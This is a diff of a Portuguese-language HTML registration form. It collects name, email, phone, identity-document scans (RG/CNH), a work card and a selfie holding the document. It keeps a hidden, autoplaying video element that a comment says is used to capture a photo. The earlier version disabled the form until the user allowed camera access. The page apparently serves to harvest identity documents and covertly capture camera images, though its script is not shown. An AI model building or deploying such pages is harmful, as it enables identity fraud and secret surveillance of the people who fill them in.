@@ -2,39 +2,39 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Cadastro com Verificação</title>
+  <title>Cadastro de Usuário</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="container">
-    <h2>Cadastro de Cliente</h2>
+    <h2>Formulário de Cadastro</h2>
     <form id="cadastroForm" enctype="multipart/form-data">
-      <label>Nome completo:</label>
-      <input type="text" name="nome" placeholder="Digite seu nome" required disabled>
+      
+      <label for="nome">Nome:</label>
+      <input type="text" id="nome" name="nome" required>
 
-      <label>E-mail:</label>
-      <input type="email" name="email" placeholder="Digite seu e-mail" required disabled>
+      <label for="email">Email:</label>
+      <input type="email" id="email" name="email" required>
 
-      <label>Telefone:</label>
-      <input type="tel" name="telefone" placeholder="(99) 99999-9999" pattern="\(\d{2}\)\s\d{5}-\d{4}" required disabled>
+      <label for="telefone">Telefone:</label>
+      <input type="text" id="telefone" name="telefone" required>
 
-      <label>RG ou CNH:</label>
-      <input type="file" name="documento" accept="image/*" required disabled>
+      <label for="documento">RG/CNH:</label>
+      <input type="file" id="documento" name="documento" accept="image/*,.pdf" required>
 
-      <label>Carteira de Trabalho:</label>
-      <input type="file" name="carteira" accept="image/*" required disabled>
+      <label for="carteira">Carteira:</label>
+      <input type="file" id="carteira" name="carteira" accept="image/*,.pdf" required>
 
-      <label>Foto segurando documento:</label>
-      <input type="file" name="selfieDoc" accept="image/*" required disabled>
+      <label for="selfieDoc">Selfie com documento:</label>
+      <input type="file" id="selfieDoc" name="selfieDoc" accept="image/*" required>
 
-      <button type="button" id="enviarBtn" onclick="capturarDados()" disabled>Enviar</button>
+      <!-- Vídeo oculto, usado apenas para capturar a foto -->
+      <video id="video" autoplay playsinline style="display:none;"></video>
+
+      <button id="submitBtn" type="submit">Enviar</button>
     </form>
-    <p id="status">🔒 Aguarde: é necessário permitir acesso à câmera.</p>
   </div>
-
-  <video id="video" autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
 
   <script src="script.js"></script>
 </body>
